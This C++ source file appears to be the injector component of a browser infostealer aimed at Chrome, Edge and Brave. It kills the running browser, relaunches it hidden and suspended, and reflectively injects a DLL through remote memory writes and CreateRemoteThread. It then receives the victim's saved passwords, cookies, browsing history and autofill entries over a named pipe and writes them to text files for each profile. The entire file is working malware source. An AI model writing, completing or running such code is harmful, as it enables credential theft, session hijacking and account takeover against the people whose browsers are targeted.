#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <filesystem>
#include "../../includes/json.hpp"
#include "../../includes/base64.h"

using json = nlohmann::json;
namespace fs = std::filesystem;

// --- BURAYA BASE64 ENCODED DLL VERİSİNİ YAPIŞTIRIN ---
const char* EMBEDDED_DLL_BASE64 = "BASE64_ENCODED_DLL";

struct DllInfo {
    void* base;
    void* load_library_a;
    void* get_proc_address;
    bool relocation_required;
};

extern "C" void NTAPI realign_pe(DllInfo* dll_info);
extern "C" void NTAPI realign_pe_end();

struct BrowserConfig {
    std::string name;
    std::wstring exe_name;
    std::vector<std::wstring> common_paths;
};

const std::vector<BrowserConfig> BROWSERS = {
    {"Chrome", L"chrome.exe", {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"}},
    {"Edge", L"msedge.exe", {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"}},
    {"Brave", L"brave.exe", {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}}
};

std::wstring find_browser_exe(const std::string& name) {
    for (const auto& config : BROWSERS) {
        if (config.name == name) {
            for (const auto& path : config.common_paths) {
                if (fs::exists(path)) return path;
            }
        }
    }
    return L"";
}

void kill_processes_by_name(const std::wstring& exe_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (exe_name == entry.szExeFile) {
                HANDLE h_process = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID);
                if (h_process) {
                    TerminateProcess(h_process, 0);
                    CloseHandle(h_process);
                }
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
}

void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& dll_bytes) {
    auto* dos_header = (PIMAGE_DOS_HEADER)dll_bytes.data();
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) throw std::runtime_error("Invalid DOS signature");

    auto* nt_headers = (PIMAGE_NT_HEADERS64)(dll_bytes.data() + dos_header->e_lfanew);
    if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) throw std::runtime_error("Not a 64-bit DLL");

    size_t image_size = nt_headers->OptionalHeader.SizeOfImage;
    void* preferred_base = (void*)nt_headers->OptionalHeader.ImageBase;

    std::cout << "[*] Image size: " << image_size << " bytes" << std::endl;

    void* remote_base = VirtualAllocEx(h_process, preferred_base, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    bool relocation_required = false;

    if (!remote_base) {
        std::cout << "[!] Preferred base unavailable, allocating elsewhere" << std::endl;
        relocation_required = true;
        remote_base = VirtualAllocEx(h_process, nullptr, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remote_base) throw std::runtime_error("Failed to allocate memory in target process");

    WriteProcessMemory(h_process, remote_base, dll_bytes.data(), nt_headers->OptionalHeader.SizeOfHeaders, nullptr);

    auto* section = IMAGE_FIRST_SECTION(nt_headers);
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section++) {
        if (section->PointerToRawData == 0 || section->SizeOfRawData == 0) continue;
        void* remote_section_addr = (void*)((size_t)remote_base + section->VirtualAddress);
        void* local_section_addr = (void*)(dll_bytes.data() + section->PointerToRawData);
        WriteProcessMemory(h_process, remote_section_addr, local_section_addr, section->SizeOfRawData, nullptr);
    }

    HMODULE h_kernel32 = GetModuleHandleA("kernel32.dll");
    DllInfo dll_info = {
        remote_base,
        (void*)GetProcAddress(h_kernel32, "LoadLibraryA"),
        (void*)GetProcAddress(h_kernel32, "GetProcAddress"),
        relocation_required
    };

    // Need to find realign_pe address. In a real scenario, this would be part of the injector.
    // For this port, we assume realign_pe is compiled into the injector and we'll copy it.
    size_t bootstrapper_size = (size_t)realign_pe_end - (size_t)realign_pe;
    if (bootstrapper_size == 0) bootstrapper_size = 4096;

    size_t total_bootstrap_size = sizeof(DllInfo) + bootstrapper_size;
    void* remote_bootstrap_mem = VirtualAllocEx(h_process, nullptr, total_bootstrap_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(h_process, remote_bootstrap_mem, &dll_info, sizeof(DllInfo), nullptr);
    void* remote_code_addr = (void*)((size_t)remote_bootstrap_mem + sizeof(DllInfo));
    WriteProcessMemory(h_process, remote_code_addr, (void*)realign_pe, bootstrapper_size, nullptr);

    HANDLE h_thread = CreateRemoteThread(h_process, nullptr, 0, (LPTHREAD_START_ROUTINE)remote_code_addr, remote_bootstrap_mem, 0, nullptr);
    if (h_thread) {
        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread);
    }
}

void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const BrowserConfig& config) {
    std::cout << "\n--- Processing Browser: " << config.name << " ---" << std::endl;

    kill_processes_by_name(config.exe_name);

    std::wstring cmd_line = config.exe_name + L" --headless --disable-gpu";
    std::wstring full_path = find_browser_exe(config.name);
    if (!full_path.empty()) {
        cmd_line = L"\"" + full_path + L"\" --headless --disable-gpu";
    }

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessW(nullptr, (LPWSTR)cmd_line.c_str(), nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        std::cerr << "Failed to create " << config.name << " process" << std::endl;
        return;
    }

    try {
        inject_dll_reflective(pi.hProcess, dll_bytes);
        ResumeThread(pi.hThread);

        HANDLE pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 65536, 65536, 0, nullptr);
        if (pipe != INVALID_HANDLE_VALUE) {
            std::cout << "Waiting for DLL connection..." << std::endl;
            if (ConnectNamedPipe(pipe, nullptr) || GetLastError() == ERROR_PIPE_CONNECTED) {
                std::vector<unsigned char> buffer;
                unsigned char temp[8192];
                DWORD bytes_read;
                bool read_success;
                do {
                    read_success = ReadFile(pipe, temp, sizeof(temp), &bytes_read, nullptr);
                    if (bytes_read > 0) {
                        buffer.insert(buffer.end(), temp, temp + bytes_read);
                    }
                } while (!read_success && GetLastError() == ERROR_MORE_DATA);

                if (!buffer.empty()) {
                    auto profiles = json::parse(buffer);
                    fs::create_directories(config.name);
                    for (size_t i = 0; i < profiles.size(); i++) {
                        std::string folder_name = "profile " + std::to_string(i + 1);
                        fs::path profile_dir = fs::path(config.name) / folder_name;
                        fs::create_directories(profile_dir);

                        auto& p = profiles[i];
                        std::ofstream pass_f(profile_dir / "password.txt");
                        for (auto& entry : p["passwords"]) pass_f << "URL: " << entry["url"] << "\nUser: " << entry["username"] << "\nPass: " << entry["password"] << "\n\n";

                        std::ofstream cook_f(profile_dir / "cookie.txt");
                        for (auto& entry : p["cookies"]) cook_f << "Host: " << entry["host"] << " | Name: " << entry["name"] << " | Value: " << entry["value"] << "\n";

                        std::ofstream hist_f(profile_dir / "history.txt");
                        for (auto& entry : p["history"]) hist_f << "URL: " << entry["url"] << " | Title: " << entry["title"] << " | Visits: " << entry["visit_count"] << "\n";

                        std::ofstream auto_f(profile_dir / "autofill.txt");
                        for (auto& entry : p["autofill"]) auto_f << "Name: " << entry["name"] << " | Value: " << entry["value"] << "\n";

                        std::cout << "Saved " << config.name << " profile: " << p["name"] << std::endl;
                    }
                }
            }
            CloseHandle(pipe);
        }
    } catch (const std::exception& e) {
        std::cerr << "Error during injection: " << e.what() << std::endl;
    }

    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main(int argc, char* argv[]) {
    std::string target_browser = "all";
    if (argc > 1) target_browser = argv[1];

    std::cout << "[*] Loading DLL bytes..." << std::endl;
    std::vector<unsigned char> dll_bytes;

    // Attempt to load from file first if embedded is placeholder
    if (std::string(EMBEDDED_DLL_BASE64) == "BASE64_ENCODED_DLL") {
        std::ifstream dll_file("proxy.dll", std::ios::binary);
        if (dll_file) {
            dll_bytes.assign((std::istreambuf_iterator<char>(dll_file)), std::istreambuf_iterator<char>());
            std::cout << "[*] Loaded proxy.dll from disk" << std::endl;
        } else {
            std::cerr << "[!] EMBEDDED_DLL_BASE64 is placeholder and proxy.dll not found on disk." << std::endl;
            return 1;
        }
    } else {
        dll_bytes = base64_decode(EMBEDDED_DLL_BASE64);
        std::cout << "[*] Decoded embedded DLL" << std::endl;
    }

    if (target_browser == "all") {
        for (const auto& config : BROWSERS) {
            inject_and_collect(dll_bytes, config);
        }
    } else {
        bool found = false;
        for (const auto& config : BROWSERS) {
            if (config.name == target_browser) {
                inject_and_collect(dll_bytes, config);
                found = true;
                break;
            }
        }
        if (!found) std::cerr << "Unsupported browser: " << target_browser << std::endl;
    }

    return 0;
}
